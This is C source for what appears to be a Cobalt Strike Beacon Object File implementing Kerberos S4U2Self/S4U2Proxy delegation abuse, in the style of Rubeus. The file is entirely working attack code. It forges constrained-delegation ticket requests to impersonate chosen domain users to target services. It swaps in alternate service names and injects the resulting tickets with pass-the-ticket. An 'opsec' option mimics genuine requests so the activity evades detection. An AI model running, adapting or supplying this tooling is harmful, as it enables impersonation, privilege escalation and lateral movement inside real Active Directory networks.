        // real packets seem to lowercase the domain in these 2 PA_DATA's
        StrToLower(domain);
        PA_DATA s4upadata = { 0 };
        if (New_PA_DATA_s4uX509user(clientKey, s4uUser, domain, req.req_body.nonce, clientKey.key_type, &s4upadata)) return TRUE;
        req.pa_data[padata_index++] = s4upadata;
    }

    // add final S4U PA-DATA
    if (s4uUser) {
        // constrained delegation yo'
        PA_DATA s4upadata = { 0 };
        if (New_PA_DATA_s4u2self(clientKey, s4uUser, domain, &s4upadata)) return TRUE;
        req.pa_data[padata_index++] = s4upadata;
    }
    else if (opsec) {
        PA_DATA padataoptions = { 0 };
        if (New_PA_DATA_options(FALSE, TRUE, FALSE, FALSE, &padataoptions)) return TRUE;
        req.pa_data[padata_index++] = padataoptions;
    }
    else if (tgs && !u2u) {
        PA_DATA padataoptions = { 0 };
        if (New_PA_DATA_options(FALSE, FALSE, FALSE, TRUE, &padataoptions)) return TRUE;
        req.pa_data[padata_index++] = padataoptions;
    }

    AsnElt reqAsn = { 0 };
    if (ReqToAsnEncode(req, 12, &reqAsn)) return TRUE;
    if (AsnToBytesEncode(&reqAsn, reqBytesSize, reqBytes)) return TRUE;

    if (opsec && s4uUser)
        StrToUpper(domain);

    return FALSE;
}

BOOL S4U2Self(KRB_CRED kirbi, char* targetUser, char* targetSPN, char* domainController, char* altService, BOOL self, BOOL opsec, BOOL ptt, int encType, KRB_CRED* retCred) {
    // extract out the info needed for the TGS-REQ/S4U2Self execution
    char* userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
    char* domain = kirbi.enc_part.ticket_info[0].prealm;
    Ticket ticket = kirbi.tickets[0];
    EncryptionKey clientKey = kirbi.enc_part.ticket_info[0].key;

    PRINT_OUT("[*] Building S4U2self request for: '%s@%s'\n", userName, domain);

    byte* tgsBytes = NULL;
    int	  tgsBytesLength = 0;
    if (NewTGS_REQ(userName, domain, userName, ticket, clientKey, subkey_keymaterial, NULL, opsec, FALSE, FALSE, NULL, targetUser, FALSE, FALSE, /*, roast */ &tgsBytes, &tgsBytesLength)) return TRUE;

    byte* response = NULL;
    int responseSize = 0;
    sendBytes(domainController, "88", tgsBytes, tgsBytesLength, &response, &responseSize);
    if (responseSize == 0)
        return TRUE;

    // decode the supplied bytes to an AsnElt object --- FALSE == ignore trailing garbage
    AsnElt responseAsn = { 0 };
    if (BytesToAsnDecode(response, responseSize, &responseAsn)) return TRUE;

    if (responseAsn.tagValue == KERB_TGS_REP) {
        PRINT_OUT("[+] S4U2self success!\n");

        // parse the response to an TGS-REP
        TGS_REP rep = { 0 };
        if (NewTGS_REP(responseAsn, &rep)) return TRUE;

        byte* outBytes = NULL;
        int  outBytesLength = 0;
        if (decrypt(clientKey.key_value, clientKey.key_type, KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, rep.enc_part.cipher, rep.enc_part.cipher_size, &outBytes, &outBytesLength)) return TRUE;

        AsnElt ae = { 0 };
        if (BytesToAsnDecode(outBytes, outBytesLength, &ae)) return TRUE;

        EncKDCRepPart encRepPart = { 0 };
        if (AsnGetEncKDCRepPart(&(ae.sub[0]), &encRepPart)) return TRUE;

        // now build the final KRB-CRED structure
        KRB_CRED cred = { 0 };
        cred.pvno = 5;
        cred.msg_type = 22;

        // if we want to use this s4u2self ticket for authentication, change the sname
        char** altSnames = 0;
        int altsvcCount = 0;
        if (altService && self) {
            char* altsvc = 0;
            if (my_copybuf(&(altsvc), altService, my_strlen(altService) + 1)) return TRUE;

            altsvcCount = 0;
            altSnames = my_strsplit( altsvc, '/', &altsvcCount );

            if (altsvcCount > 1) {
                rep.ticket.sname.name_count = 2;
                rep.ticket.sname.name_string = MemAlloc(sizeof(void*) * 2);
                if (my_copybuf(&(rep.ticket.sname.name_string[0]), altSnames[0], my_strlen(altSnames[0]) + 1)) return TRUE;
                if (my_copybuf(&(rep.ticket.sname.name_string[1]), altSnames[1], my_strlen(altSnames[1]) + 1)) return TRUE;
            }
        }

        // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart
        KrbCredInfo info = { 0 };

        info.key = encRepPart.key;
        if (my_copybuf(&(info.key.key_value), encRepPart.key.key_value, encRepPart.key.key_size)) return TRUE;

        if (my_copybuf(&(info.prealm), rep.crealm, my_strlen(rep.crealm) + 1)) return TRUE;

        info.pname = rep.cname;
        info.pname.name_string = MemAlloc(info.pname.name_count * sizeof(void*));
        for (int i = 0; i < info.pname.name_count; i++)
            if (my_copybuf(&(info.pname.name_string[i]), rep.cname.name_string[i], my_strlen(rep.cname.name_string[i]) + 1)) return TRUE;

        cred.ticket_count = 1;
        cred.tickets = MemAlloc(cred.ticket_count * sizeof(Ticket));
        if (!cred.tickets) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }
        cred.tickets[0] = rep.ticket;

        info.flags = encRepPart.flags;
        info.starttime = encRepPart.starttime;
        info.endtime = encRepPart.endtime;
        info.renew_till = encRepPart.renew_till;

        if (my_copybuf(&(info.srealm), rep.crealm, my_strlen(rep.crealm) + 1)) return TRUE;

        info.sname = encRepPart.sname;
        info.sname.name_string = MemAlloc(info.sname.name_count * sizeof(void*));
        for (int i = 0; i < info.sname.name_count; i++)
            if (my_copybuf(&(info.sname.name_string[i]), encRepPart.sname.name_string[i], my_strlen(encRepPart.sname.name_string[i]) + 1)) return TRUE;

        // if we want to use the s4u2self change the sname here too
        if (altService && self) {
            PRINT_OUT("[*] Substituting alternative service name '%s'\n", altService);
            if (altsvcCount > 1) {
                info.sname.name_count = 2;
                info.sname.name_string = MemAlloc(sizeof(void*) * 2);
                if (my_copybuf(&(info.sname.name_string[0]), altSnames[0], my_strlen(altSnames[0]) + 1)) return TRUE;
                if (my_copybuf(&(info.sname.name_string[1]), altSnames[1], my_strlen(altSnames[1]) + 1)) return TRUE;

            }
        }

        cred.enc_part.ticket_count = 1;
        cred.enc_part.ticket_info = MemAlloc(cred.enc_part.ticket_count * sizeof(KrbCredInfo));
        if (!cred.enc_part.ticket_info) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }
        cred.enc_part.ticket_info[0] = info;

        AsnElt asnCred = { 0 };
        if (AsnKrbCredEncode(&cred, &asnCred)) return TRUE;

        byte* kirbiBytes = NULL;
        int   kirbiBytesSize = 0;
        if (AsnToBytesEncode(&asnCred, &kirbiBytesSize, &kirbiBytes)) return TRUE;

        char* kirbiString = base64_encode(kirbiBytes, kirbiBytesSize);

        PRINT_OUT("[*] Got a TGS for '%s' to '%s@%s'\n", info.pname.name_string[0], info.sname.name_string[0], info.srealm);
        PRINT_OUT("[*] base64(ticket.kirbi):\n\n%s\n\n", kirbiString);

        if (ptt && self)
            PTT(NULL, kirbiString);

        *retCred = cred;
        return FALSE;
    }
    else if (responseAsn.tagValue == KERB_ERROR) {
        uint error_code = 0;
        if (AsnGetErrorCode(&(responseAsn.sub[0]), &error_code)) return TRUE;
        PRINT_OUT("\n\t[x] Kerberos error : %d\n", error_code);
    }
    else {
        PRINT_OUT("\n[X] Unknown application tag: %d\n", responseAsn.tagValue);
    }

    return TRUE;
}

BOOL S4U2Proxy(KRB_CRED kirbi, char* targetUser, char* targetSPN, char* domainController, char* altService, KRB_CRED tgs, BOOL opsec, BOOL ptt) {
    PRINT_OUT("[*] Impersonating user '%s' to target SPN '%s'\n", targetUser, targetSPN);
    char** altSnames = 0;
    int altsvcCount = 0;
    if (altService) {
        char* altsvc = 0;
        if (my_copybuf(&(altsvc), altService, my_strlen(altService) + 1)) return TRUE;

        altsvcCount = 0;
        altSnames = my_strsplit( altsvc, ',', &altsvcCount );

        if (altsvcCount == 1)
            PRINT_OUT("[*]   Final ticket will be for the alternate service '%s'\n", altService);
        else
            PRINT_OUT("[*]   Final tickets will be for the alternate services '%s'\n", altService);
    }

    // extract out the info needed for the TGS-REQ/S4U2Proxy execution
    char* userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
    char* domain = kirbi.enc_part.ticket_info[0].prealm;
    Ticket ticket = kirbi.tickets[0];
    EncryptionKey clientKey = kirbi.enc_part.ticket_info[0].key;

    PRINT_OUT("[*] Building S4U2proxy request for service: '%s'\n", targetSPN);

    AS_REQ s4u2proxyReq = { 0 };
    s4u2proxyReq.pvno = 5;
    s4u2proxyReq.msg_type = KERB_TGS_REQ;
    s4u2proxyReq.req_body.kdc_options = FORWARDABLE | RENEWABLE | RENEWABLEOK | CONSTRAINED_DELEGATION;
    if (!opsec) {
        s4u2proxyReq.req_body.cname.name_type = PRINCIPAL_NT_PRINCIPAL;
    }
    s4u2proxyReq.req_body.till = 1 * 3600;   // valid for 1h
    ADVAPI32$SystemFunction036(&(s4u2proxyReq.req_body.nonce), 4);

    if (my_copybuf(&(s4u2proxyReq.req_body.realm), domain, my_strlen(domain) + 1)) return TRUE;

    char* spn = 0;
    if (my_copybuf(&(spn), targetSPN, my_strlen(targetSPN) + 1)) return TRUE;

    int partsCount = 0;
    char** parts = my_strsplit( spn, '/', &partsCount );
    if (partsCount < 2)
        return TRUE;

    char* serverName = parts[partsCount - 1];
    s4u2proxyReq.req_body.sname.name_type = PRINCIPAL_NT_SRV_INST;
    s4u2proxyReq.req_body.sname.name_count = partsCount;
    s4u2proxyReq.req_body.sname.name_string = MemAlloc(sizeof(void*) * s4u2proxyReq.req_body.sname.name_count);
    for (int i = 0; i < partsCount; i++)
        s4u2proxyReq.req_body.sname.name_string[i] = parts[i];

    if (opsec) {
        s4u2proxyReq.req_body.etypes_count = 5;
        s4u2proxyReq.req_body.etypes = MemAlloc(s4u2proxyReq.req_body.etypes_count * sizeof(DWORD));
        s4u2proxyReq.req_body.etypes[0] = aes128_cts_hmac_sha1;
        s4u2proxyReq.req_body.etypes[1] = aes256_cts_hmac_sha1;
        s4u2proxyReq.req_body.etypes[2] = rc4_hmac;
        s4u2proxyReq.req_body.etypes[3] = rc4_hmac_exp;
        s4u2proxyReq.req_body.etypes[4] = old_exp;
    }
    else {
        s4u2proxyReq.req_body.etypes_count = 3;
        s4u2proxyReq.req_body.etypes = MemAlloc(s4u2proxyReq.req_body.etypes_count * sizeof(DWORD));
        s4u2proxyReq.req_body.etypes[0] = aes128_cts_hmac_sha1;
        s4u2proxyReq.req_body.etypes[1] = aes256_cts_hmac_sha1;
        s4u2proxyReq.req_body.etypes[2] = rc4_hmac;
    }

    s4u2proxyReq.req_body.additional_tickets_count = 1;
    s4u2proxyReq.req_body.additional_tickets = MemAlloc(s4u2proxyReq.req_body.additional_tickets_count * sizeof(Ticket));
    s4u2proxyReq.req_body.additional_tickets[0] = tgs.tickets[0];

    byte* cksum_Bytes = NULL;
    int cksum_Bytes_length = 0;

    if (opsec) {
        // remove renewableok and add canonicalize
        s4u2proxyReq.req_body.kdc_options = s4u2proxyReq.req_body.kdc_options ^ (s4u2proxyReq.req_body.kdc_options & RENEWABLEOK);
        s4u2proxyReq.req_body.kdc_options = s4u2proxyReq.req_body.kdc_options | CANONICALIZE;

        // 15 minutes in the future like genuine requests
        s4u2proxyReq.req_body.till = 900;

        // get hostname and hostname of SPN
        int size = MAX_COMPUTERNAME_LENGTH + 2;
        char* hostname = MemAlloc(size);
        if (!hostname) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }
        KERNEL32$GetComputerNameA(hostname, &size);

        char* targetHostName;
        if (partsCount > 1) {
            int substrIndex = my_strfind(parts[1], '.');
            if (substrIndex < 0)
                substrIndex = my_strlen(parts[1]) + 1;

            my_copybuf(&(targetHostName), parts[1], substrIndex);
            targetHostName[substrIndex] = 0;
            StrToUpper(targetHostName);
        }
        else {
            my_copybuf(&(targetHostName), hostname, my_strlen(hostname) + 1);
        }

        // create enc-authorization-data if target host is not the local machine
        if (my_strcmp(hostname, targetHostName)) {

            ADIfRelevant ifrelevant = { 0 };
            ifrelevant.ad_type = 1;
            ifrelevant.ADData_count = 2;
            ifrelevant.ADData = MemAlloc(2 * sizeof(void*));

            ADRestrictionEntry restrictions = { 0 };
            restrictions.ad_type = 141; // KERB_AUTH_DATA_TOKEN_RESTRICTIONS;
            restrictions.restriction_type = 0;
            restrictions.restriction_length = 40;
            restrictions.restriction = ADRestrictionEntry_buildTokenStruct(1, 8192);

            ADKerbLocal kerbLocal = { 0 };
            kerbLocal.ad_type = 142; // KERB_LOCAL
            kerbLocal.ad_data_length = 16;
            kerbLocal.ad_data = MemAlloc(16);
            ADVAPI32$SystemFunction036(kerbLocal.ad_data, 16);

            ifrelevant.ADData[0] = &restrictions;
            ifrelevant.ADData[1] = &kerbLocal;

            AsnElt authDataSeq = { 0 }, authDataSeqContext = { 0 };
            if (AsnADIfRelevantEncode(&ifrelevant, &authDataSeq)) return TRUE;
            if (Make3(ASN_SEQUENCE, &authDataSeq, 1, &authDataSeqContext)) return TRUE;

            byte* authorizationDataBytes = NULL;
            int authorizationDataBytesLegth = 0;
            if (AsnToBytesEncode(&authDataSeqContext, &authorizationDataBytesLegth, &authorizationDataBytes)) return TRUE;

            s4u2proxyReq.req_body.enc_authorization_data.etype = tgs.enc_part.ticket_info[0].key.key_type;

            byte* enc_authorization_data = NULL;
            int enc_authorization_data_length = 0;
            if (encrypt(authorizationDataBytes, authorizationDataBytesLegth, tgs.enc_part.ticket_info[0].key.key_value, tgs.enc_part.ticket_info[0].key.key_type, KRB_KEY_USAGE_TGS_REQ_ENC_AUTHOIRZATION_DATA,
                        &(s4u2proxyReq.req_body.enc_authorization_data.cipher), &(s4u2proxyReq.req_body.enc_authorization_data.cipher_size))) return TRUE;
        }

        // encode req_body for authenticator cksum
        AsnElt req_Body_ASN = { 0 }, req_Body_ASNSeq = { 0 }, req_Body_ASNSeqContext = { 0 };
        if (AsnKDCReqBodyEncode(&(s4u2proxyReq.req_body), &req_Body_ASN)) return TRUE;
        if (Make3(ASN_SEQUENCE, &req_Body_ASN, 1, &req_Body_ASNSeq)) return TRUE;
        if (MakeImplicit(ASN_CONTEXT, 4, &req_Body_ASNSeq, &req_Body_ASNSeqContext)) return TRUE;

        int req_Body_Bytes_length = ValueLength(&req_Body_ASNSeqContext);
        byte* req_Body_Bytes = MemAlloc(req_Body_Bytes_length);
        req_Body_Bytes_length = EncodeValue(&req_Body_ASNSeqContext, 0, req_Body_Bytes_length, req_Body_Bytes, 0);

        checksum(clientKey.key_value, clientKey.key_size, req_Body_Bytes, req_Body_Bytes_length, KERB_CHECKSUM_RSA_MD5, KRB_KEY_USAGE_KRB_NON_KERB_CKSUM_SALT, &cksum_Bytes, &cksum_Bytes_length);
    }

    // moved to end so we can have the checksum in the authenticator
    PA_DATA padata = { 0 };
    if (New_PA_DATA(domain, userName, ticket, clientKey, opsec, cksum_Bytes, cksum_Bytes_length, &padata)) return TRUE;

    s4u2proxyReq.pa_data_count = 2;
    s4u2proxyReq.pa_data = MemAlloc(s4u2proxyReq.pa_data_count * sizeof(PA_DATA));
    s4u2proxyReq.pa_data[0] = padata;

    PA_DATA pac_options = { 0 };
    if (New_PA_DATA_options(FALSE, TRUE, FALSE, FALSE, &pac_options)) return TRUE;
    s4u2proxyReq.pa_data[1] = pac_options;

    byte* reqBytes = NULL;
    int   reqBytesSize = 0;
    AsnElt s4u2proxyReqAsn = { 0 };
    if (ReqToAsnEncode(s4u2proxyReq, 12, &s4u2proxyReqAsn)) return TRUE;
    if (AsnToBytesEncode(&s4u2proxyReqAsn, &reqBytesSize, &reqBytes)) return TRUE;

    byte* response2 = NULL;
    int response2Size = 0;
    sendBytes(domainController, "88", reqBytes, reqBytesSize, &response2, &response2Size);
    if (response2Size == 0)
        return TRUE;

    // decode the supplied bytes to an AsnElt object --- FALSE == ignore trailing garbage
    AsnElt responseAsn = { 0 };
    if (BytesToAsnDecode(response2, response2Size, &responseAsn)) return TRUE;

    if (responseAsn.tagValue == KERB_TGS_REP) {
        PRINT_OUT("[+] S4U2proxy success!\n");

        TGS_REP rep2 = { 0 };
        if (AsnGetTGS_REP(&responseAsn, &rep2)) return TRUE;

        byte* outBytes2 = NULL;
        int  outBytes2Length = 0;
        if (decrypt(clientKey.key_value, clientKey.key_type, KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, rep2.enc_part.cipher, rep2.enc_part.cipher_size, &outBytes2, &outBytes2Length)) return TRUE;

        AsnElt ae2 = { 0 };
        if (BytesToAsnDecode(outBytes2, outBytes2Length, &ae2)) return TRUE;

        EncKDCRepPart encRepPart2 = { 0 };
        if (AsnGetEncKDCRepPart(&(ae2.sub[0]), &encRepPart2)) return TRUE;

        if (altService) {
            for (int ind = 0; ind < altsvcCount; ind++) {
                // now build the final KRB-CRED structure with one or more alternate snames
                KRB_CRED cred = { 0 };
                cred.pvno = 5;
                cred.msg_type = 22;

                // since we want an alternate sname, first substitute it into the ticket structure
                rep2.ticket.sname.name_string[0] = altSnames[ind];

                cred.ticket_count = 1;
                cred.tickets = MemAlloc(cred.ticket_count * sizeof(Ticket));
                if (!cred.tickets) {
                    PRINT_OUT("[x] Failed alloc memory");
                    return TRUE;
                }
                cred.tickets[0] = rep2.ticket;

                KrbCredInfo info = { 0 };

                info.key = encRepPart2.key;
                if (my_copybuf(&(info.key.key_value), encRepPart2.key.key_value, encRepPart2.key.key_size)) return TRUE;

                if (my_copybuf(&(info.prealm), encRepPart2.realm, my_strlen(encRepPart2.realm) + 1)) return TRUE;

                info.pname = rep2.cname;
                info.pname.name_string = MemAlloc(info.pname.name_count * sizeof(void*));
                for (int i = 0; i < info.pname.name_count; i++)
                    if (my_copybuf(&(info.pname.name_string[i]), rep2.cname.name_string[i], my_strlen(rep2.cname.name_string[i]) + 1)) return TRUE;

                info.flags = encRepPart2.flags;
                info.starttime = encRepPart2.starttime;
                info.endtime = encRepPart2.endtime;
                info.renew_till = encRepPart2.renew_till;

                if (my_copybuf(&(info.srealm), encRepPart2.realm, my_strlen(encRepPart2.realm) + 1)) return TRUE;

                info.sname = encRepPart2.sname;
                info.sname.name_string = MemAlloc(info.sname.name_count * sizeof(void*));
                for (int i = 0; i < info.sname.name_count; i++)
                    if (my_copybuf(&(info.sname.name_string[i]), encRepPart2.sname.name_string[i], my_strlen(encRepPart2.sname.name_string[i]) + 1)) return TRUE;

                // if we want an alternate sname, substitute it into the encrypted portion of the KRB_CRED
                PRINT_OUT("[*] Substituting alternative service name '%s'\n", altSnames[ind]);
                info.sname.name_string[0] = altSnames[ind];

                cred.enc_part.ticket_count = 1;
                cred.enc_part.ticket_info = MemAlloc(cred.enc_part.ticket_count * sizeof(KrbCredInfo));
                if (!cred.enc_part.ticket_info) {
                    PRINT_OUT("[x] Failed alloc memory");
                    return TRUE;
                }
                cred.enc_part.ticket_info[0] = info;

                AsnElt asnCred = { 0 };
                if (AsnKrbCredEncode(&cred, &asnCred)) return TRUE;

                byte* kirbiBytes = NULL;
                int   kirbiBytesSize = 0;
                if (AsnToBytesEncode(&asnCred, &kirbiBytesSize, &kirbiBytes)) return TRUE;

                char* kirbiString = base64_encode(kirbiBytes, kirbiBytesSize);

                PRINT_OUT("[*] base64(ticket.kirbi) for SPN '%s/%s':\n\n", altSnames[ind], serverName);
                PRINT_OUT("%s\n\n", kirbiString);

                if (ptt)
                    PTT(NULL, kirbiString);
            }
        }
        else {
            // now build the final KRB-CRED structure, no alternate snames
            KRB_CRED cred = { 0 };
            cred.pvno = 5;
            cred.msg_type = 22;
            cred.ticket_count = 1;
            cred.tickets = MemAlloc(cred.ticket_count * sizeof(Ticket));
            if (!cred.tickets) {
                PRINT_OUT("[x] Failed alloc memory");
                return TRUE;
            }
            cred.tickets[0] = rep2.ticket;

            KrbCredInfo info = { 0 };

            info.key = encRepPart2.key;
            if (my_copybuf(&(info.key.key_value), encRepPart2.key.key_value, encRepPart2.key.key_size)) return TRUE;

            if (my_copybuf(&(info.prealm), encRepPart2.realm, my_strlen(encRepPart2.realm) + 1)) return TRUE;

            info.pname = rep2.cname;
            info.pname.name_string = MemAlloc(info.pname.name_count * sizeof(void*));
            for (int i = 0; i < info.pname.name_count; i++)
                if (my_copybuf(&(info.pname.name_string[i]), rep2.cname.name_string[i], my_strlen(rep2.cname.name_string[i]) + 1)) return TRUE;

            info.flags = encRepPart2.flags;
            info.starttime = encRepPart2.starttime;
            info.endtime = encRepPart2.endtime;
            info.renew_till = encRepPart2.renew_till;

            if (my_copybuf(&(info.srealm), encRepPart2.realm, my_strlen(encRepPart2.realm) + 1)) return TRUE;

            info.sname = encRepPart2.sname;
            info.sname.name_string = MemAlloc(info.sname.name_count * sizeof(void*));
            for (int i = 0; i < info.sname.name_count; i++)
                if (my_copybuf(&(info.sname.name_string[i]), encRepPart2.sname.name_string[i], my_strlen(encRepPart2.sname.name_string[i]) + 1)) return TRUE;

            cred.enc_part.ticket_count = 1;
            cred.enc_part.ticket_info = MemAlloc(cred.enc_part.ticket_count * sizeof(KrbCredInfo));
            if (!cred.enc_part.ticket_info) {
                PRINT_OUT("[x] Failed alloc memory");
                return TRUE;
            }
            cred.enc_part.ticket_info[0] = info;

            AsnElt asnCred = { 0 };
            if (AsnKrbCredEncode(&cred, &asnCred)) return TRUE;

            byte* kirbiBytes = NULL;
            int   kirbiBytesSize = 0;
            if (AsnToBytesEncode(&asnCred, &kirbiBytesSize, &kirbiBytes)) return TRUE;

            char* kirbiString = base64_encode(kirbiBytes, kirbiBytesSize);

            PRINT_OUT("[*] base64(ticket.kirbi) for SPN '%s':\n\n", targetSPN);
            PRINT_OUT("%s\n\n", kirbiString);

            if (ptt)
                PTT(NULL, kirbiString);
        }
        return FALSE;
    }
    else if (responseAsn.tagValue == KERB_ERROR) {
        uint error_code = 0;
        if (AsnGetErrorCode(&(responseAsn.sub[0]), &error_code)) return TRUE;
        PRINT_OUT("\n\t[x] Kerberos error : %d\n", error_code);
    }
    else {
        PRINT_OUT("\n[X] Unknown application tag: %d\n", responseAsn.tagValue);
    }

    return TRUE;
}

void S4UExecute_Ticket(byte* ticket, char* targetUser, char* targetSPN, char* domainController, char* altService, KRB_CRED tgs, BOOL s, BOOL opsec, BOOL ptt, int encType, char* targetDomainController, char* targetDomain, char* requestDomain) { /*BOOL ptt = FALSE, string keyString = "", string impersonateDomain = "" */
    int bytesSize = 0;
    byte* bytes = base64_decode(ticket, &bytesSize);

    KRB_CRED kirbi = { 0 };
    AsnElt   asn_KRB_CRED = { 0 };
    if (BytesToAsnDecode3(bytes, bytesSize, FALSE, &asn_KRB_CRED)) return;
    if (AsnGetKrbCred(&(asn_KRB_CRED.sub[0]), &kirbi)) return;

    if (tgs.enc_part.ticket_count && targetSPN) {
        PRINT_OUT("[*] Loaded a TGS for %s\\%s\n", tgs.enc_part.ticket_info[0].prealm, tgs.enc_part.ticket_info[0].pname.name_string[0]);
        S4U2Proxy(kirbi, targetUser, targetSPN, domainController, altService, tgs, opsec, ptt);
    }
    else {
        KRB_CRED self = {0};
        BOOL r = S4U2Self(kirbi, targetUser, targetSPN, domainController, altService, s, opsec, ptt, encType, &self);
        if (r) {
            PRINT_OUT("[X] S4U2Self failed, unable to perform S4U2Proxy.\n");
            return;
        }
        if (targetSPN)
            S4U2Proxy(kirbi, targetUser, targetSPN, domainController, altService, self, opsec, ptt);
    }
}

void ASK_S4U_RUN( PCHAR Buffer, DWORD Length ) {
    PRINT_OUT("[*] Action: S4U\n\n");

    char* user         = NULL;
    char* domain       = NULL;
    char* dc           = NULL;
    char* hash         = NULL;
    int   encType      = subkey_keymaterial;
    int   curEType     = 0;
    BOOL  ptt          = FALSE;
    BOOL  opsec        = FALSE;
    BOOL  pac          = TRUE;
    BOOL  self         = FALSE;
    char* targetSPN    = NULL;
    byte* ticket       = NULL;
    byte* tgs          = NULL;
    char* altSname     = NULL;
    char* targetUser   = NULL;

    for (int i = 0; i < Length; i++) {
        i += GetStrParam(Buffer + i, Length - i, "/user:", 6, &user );
        i += GetStrParam(Buffer + i, Length - i, "/domain:", 8, &domain );
        i += GetStrParam(Buffer + i, Length - i, "/ticket:", 8, &ticket );
        i += GetStrParam(Buffer + i, Length - i, "/dc:", 4, &dc );
        i += GetStrParam(Buffer + i, Length - i, "/service:", 9, &targetSPN );
        i += GetStrParam(Buffer + i, Length - i, "/tgs:", 5, &tgs );
        i += GetStrParam(Buffer + i, Length - i, "/altservice:", 12, &altSname );
        i += GetStrParam(Buffer + i, Length - i, "/impersonateuser:", 17, &targetUser );
        i += IsSetParam(Buffer + i, Length - i, "/ptt", 4, &ptt );
        i += IsSetParam(Buffer + i, Length - i, "/opsec", 6, &opsec );
        i += IsSetParam(Buffer + i, Length - i, "/nopac", 6, &pac );
        i += IsSetParam(Buffer + i, Length - i, "/self", 5, &self );
//        int h1 = GetStrParam(Buffer + i, Length - i, "/rc4:", 5, &hash );
//        if(h1){
//            encType = rc4_hmac;
//            curEType = encType;
//        }
//        int h2 = GetStrParam(Buffer + i, Length - i, "/aes256:", 8, &hash );
//        if(h2){
//            encType = aes256_cts_hmac_sha1;
//            curEType = encType;
//        }
    }

    pac = !pac;

    GetDomainInfo(&domain, &dc);
    if (domain == NULL || dc == NULL) {
        PRINT_OUT("[X] Could not retrieve domain information!\n\n");
        return;
    }

    if (targetUser && tgs) {
        PRINT_OUT("\n[X] You must supply either a /impersonateuser or a /tgs, but not both.\n");
        return;
    }

    KRB_CRED kirbi_tgs = { 0 };
    if (tgs) {
        int bytesTgsSize = 0;
        byte* bytesTgs = base64_decode(tgs, &bytesTgsSize);

        AsnElt   asn_KRB_CRED = { 0 };
        if (BytesToAsnDecode3(bytesTgs, bytesTgsSize, FALSE, &asn_KRB_CRED)) return;

        AsnGetKrbCred(&(asn_KRB_CRED.sub[0]), &kirbi_tgs);

        targetUser = kirbi_tgs.enc_part.ticket_info[0].pname.name_string[0];
    }
    if (!targetUser && !tgs) {
        PRINT_OUT("\n[X] You must supply a /tgs or /impersonateuser to impersonate!\n");
        return;
    }
    if (!targetSPN && tgs) {
        PRINT_OUT("\n[X] If a /tgs is supplied, you must also supply a /service !\n");
        return;
    }

    if (ticket)
        S4UExecute_Ticket(ticket, targetUser, targetSPN, dc, altSname, kirbi_tgs, self, opsec, ptt, encType, NULL, NULL, domain);
//    else if (user && hash)
//        S4UExecute_User(user, domain, hash, curEType, encType, targetUser, targetSPN, dc, altSname, kirbi_tgs, self, opsec, ptt, pac, NULL, NULL);
    else
        PRINT_OUT("\n[X] A /ticket:X needs to be supplied for S4U!\n");
}

VOID go( IN PCHAR Buffer, IN ULONG Length ) {
    INIT_BOF();

    datap parser;
    BeaconDataParse(&parser, Buffer, Length);
    DWORD PARAM_SIZE = 0;
    PBYTE PARAM = BeaconDataExtract(&parser, &PARAM_SIZE);

    if( LoadFunc() )
        PRINT_OUT("%s\n", "Modules not loaded");
    else
        ASK_S4U_RUN( PARAM, PARAM_SIZE );

    FreeBank();

    END_BOF();
}